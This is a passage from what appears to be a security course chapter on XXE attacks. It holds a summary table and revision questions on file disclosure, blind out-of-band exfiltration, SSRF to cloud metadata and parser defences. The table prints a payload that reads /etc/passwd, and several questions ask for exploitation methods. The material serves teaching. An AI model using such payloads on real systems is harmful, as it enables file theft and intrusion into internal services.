| **File Disclosure**         | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` — read arbitrary server files                       |
| **Blind XXE**               | OOB exfiltration via parameter entities → external DTD → HTTP/DNS/FTP callbacks                 |
| **XXE via File Upload**     | SVG, DOCX, XLSX, PPTX — XML-based formats can carry XXE payloads                               |
| **SSRF via XXE**            | Entities can target internal services (AWS metadata, admin panels, databases)                    |
| **Most Vulnerable Parser**  | Java (all parsers default to XXE-enabled); PHP < 8.0; Python lxml                              |
| **Best Prevention**         | Disable DTD processing entirely; use defusedxml/safe defaults; prefer JSON                      |

---

## Revision Questions

1. **Explain the difference between general entities and parameter entities in XML. Why are parameter entities essential for blind XXE exfiltration, and how does the two-stage OOB exfiltration technique work?**

2. **A web application allows users to upload SVG files as profile avatars. The server processes these files using an XML parser. Describe how you would craft an XXE payload within an SVG file to read `/etc/passwd`, and explain what conditions must be met for the attack to succeed.**

3. **Compare XXE vulnerability across Java, PHP (< 8.0 and ≥ 8.0), Python (lxml vs etree vs defusedxml), and .NET (< 4.5.2 and ≥ 4.5.2). Which platforms are secure by default, and what specific configuration changes are needed for each?**

4. **Describe how XXE can be used as an SSRF vector to access the AWS Instance Metadata Service (IMDS). What information can be extracted, and how could this lead to full AWS account compromise? How does IMDSv2 mitigate this risk?**

5. **You have identified a blind XXE vulnerability in a Java application. HTTP outbound traffic is blocked by a firewall, but DNS resolution to external domains is allowed. Describe your complete exploitation methodology, including the exact DTD payload and attacker-side infrastructure needed.**

6. **A developer argues that input validation (rejecting requests containing `<!DOCTYPE` or `<!ENTITY`) is sufficient to prevent XXE. Evaluate this defense strategy — what bypass techniques could an attacker use, and what is the recommended defense approach instead?**

---

*Previous: [03-xml-injection.md](03-xml-injection.md) | Next: [05-template-injection-ssti.md](05-template-injection-ssti.md)*

---

*[Back to README](../README.md)*
